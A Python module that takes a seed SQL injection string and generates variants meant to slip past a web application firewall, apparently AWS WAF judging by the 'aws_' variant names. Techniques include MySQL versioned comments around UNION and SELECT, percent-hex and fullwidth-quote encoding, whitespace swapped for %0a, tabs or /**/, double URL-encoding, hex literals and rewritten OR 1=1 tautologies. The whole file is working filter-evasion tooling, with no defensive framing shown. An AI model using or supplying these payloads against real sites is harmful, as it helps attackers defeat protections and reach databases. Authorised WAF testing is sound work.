import re
from urllib.parse import quote


def augment_variants(
    variants: list[tuple[str, str]],
    seed: str,
    max_extra: int = 120,
    sql_dialect: str = "postgresql",
) -> list[tuple[str, str]]:
    seen: set[str] = {p for p, _ in variants}
    extra: list[tuple[str, str]] = []
    for p, name in _extra_from_seed(seed, sql_dialect):
        if not p or p in seen:
            continue
        seen.add(p)
        extra.append((p, name))
        if len(extra) >= max_extra:
            break
    return variants + extra


def _extra_from_seed(seed: str, sql_dialect: str = "postgresql"):
    if not seed.strip():
        return
    d = (sql_dialect or "postgresql").lower().strip()
    is_pg = d in ("postgresql", "pg", "postgres")
    u = seed.upper()
    if "UNION" in u:
        if not is_pg:
            yield (re.sub(r"UNION", "/*!50000UNION*/", seed, count=1, flags=re.I), "aws_mysql_cond_union")
            yield (re.sub(r"UNION", "/*!50000uniOn*/", seed, count=1, flags=re.I), "aws_mysql_cond_union_mixed")
        i = u.find("UNION")
        if i >= 0:
            p = seed[:i] + "%55%4E%49%4F%4E" + seed[i + 5 :]
            yield (p, "aws_union_pct_hex")
    if "SELECT" in u and not is_pg:
        yield (re.sub(r"SELECT", "/*!50000SELECT*/", seed, count=1, flags=re.I), "aws_mysql_cond_select")
    if not is_pg and "FROM DUAL" in u:
        yield (seed.replace("FROM DUAL--", "from dual--"), "aws_dual_ci")
        yield (
            seed.replace("UNION SELECT 1,2 FROM DUAL--", "UNION SELECT NULL,NULL FROM DUAL--"),
            "aws_null_null",
        )
        yield (seed.replace(" FROM DUAL--", " FROM (SELECT 1) AS _--"), "aws_inline_from")
        yield (seed.replace(" FROM DUAL--", "--"), "aws_drop_from")
    elif re.search(r"UNION\s+SELECT\s+1\s*,\s*2\s*--", seed, flags=re.I):
        yield (
            re.sub(
                r"UNION\s+SELECT\s+1\s*,\s*2\s*--",
                "UNION SELECT NULL,NULL--",
                seed,
                count=1,
                flags=re.I,
            ),
            "aws_pg_null_null",
        )
        yield (
            re.sub(
                r"UNION\s+SELECT\s+1\s*,\s*2\s*--",
                "UNION SELECT 1,2 FROM (SELECT 1) AS _--",
                seed,
                count=1,
                flags=re.I,
            ),
            "aws_pg_scalar_from",
        )
    elif re.search(r"\bOR\s+1\s*=\s*1\s*--", seed, flags=re.I):
        yield (re.sub(r"1\s*=\s*1", "2=2", seed, count=1, flags=re.I), "aws_pg_or_equiv")
        yield (re.sub(r"1\s*=\s*1", "true", seed, count=1, flags=re.I), "aws_pg_or_true")
        yield (re.sub(r"\bOR\b", "OR%0a", seed, count=1, flags=re.I), "aws_or_lf")
    if "'" in seed:
        yield (seed.replace("'", "\uff07", 1), "aws_fullwidth_quote")
        yield (seed.replace("'", "%ef%bc%87", 1), "aws_fullwidth_quote_pct")
    for rep, tag in [
        ("%09", "tab"),
        ("%0a", "lf"),
        ("%0d", "cr"),
        ("%0b", "vt"),
        ("%0c", "ff"),
        ("/**/", "slash_star"),
    ]:
        if " " in seed:
            yield (seed.replace(" ", rep, 1), f"aws_one_space_{tag}")
    if " " in seed:
        yield (re.sub(r"\s+", "/**/", seed), "aws_ws_slash_star_all")
    yield (quote(seed, safe=""), "aws_full_quote_all")
    yield (quote(quote(seed, safe=""), safe=""), "aws_double_quote_all")
    if not is_pg:
        try:
            b = seed.encode("utf-8")
            yield ("0x" + b.hex(), "aws_hex_literal_full")
        except Exception:
            pass
    if re.search(r"UNION\s+SELECT", seed, flags=re.I):
        yield (
            re.sub(r"UNION\s+SELECT", "UNION%0aSELECT", seed, count=1, flags=re.I),
            "aws_union_select_lf",
        )
